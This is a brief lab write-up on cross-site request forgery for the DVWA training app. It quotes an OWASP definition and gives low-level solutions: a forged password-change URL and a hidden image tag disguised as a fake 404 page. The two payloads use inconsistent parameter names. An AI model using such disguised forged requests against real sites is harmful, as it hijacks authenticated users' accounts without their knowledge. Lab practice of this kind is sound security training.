## Description of CSRF
* CSRF : Cross-Site-Request-Forgery is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated.With helping of such as sending a link via email or chat, or embedded a link in <img> tag, an attacker may trick the users of web application into executing actions of the attacker's choosing.If the Victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transfering funds, changing their email address, and so forth.If Victim is an administrative account, CSRF can compromise the entire web application. (Description content extracted from https://owasp.org/www-community/attacks/csrf)
* It's sometimes possible to store CSRF attack on the vulnerable site itself. Such vulnerablilities are called "stored CSRF flaws". This can be accomplished by simply storing an IMG or IFRAME tag in a field that accepts HTML, or by a more complex cross-site scripting attack.

# Task-2 of DVMA
## Solutions of CSRF
* The key of CSRF attack is that, send the request forgery by using victim's cookies.
### Low Security Level
* Soulution-1:
  * Construct the link as follow: 
  
        http://192.168.178.34/vulnerabilities/csrf/?pass_new=password&pass_conf=password&Change=Change#
  
* Solution-2:
  * Construct an attack page as follow, then upload to the web appliaction, and trick the users of web application into executing actions of attacker choosing.
  
        <img src="http://192.168.178.34/vulnerabilities/csrf/?password_new=hack&password_conf=hack&Change=Change#" border="0" style="display:none;"/>
        <h1>404<h1>
        <h2>file not found.<h2>

### Medium Security Level
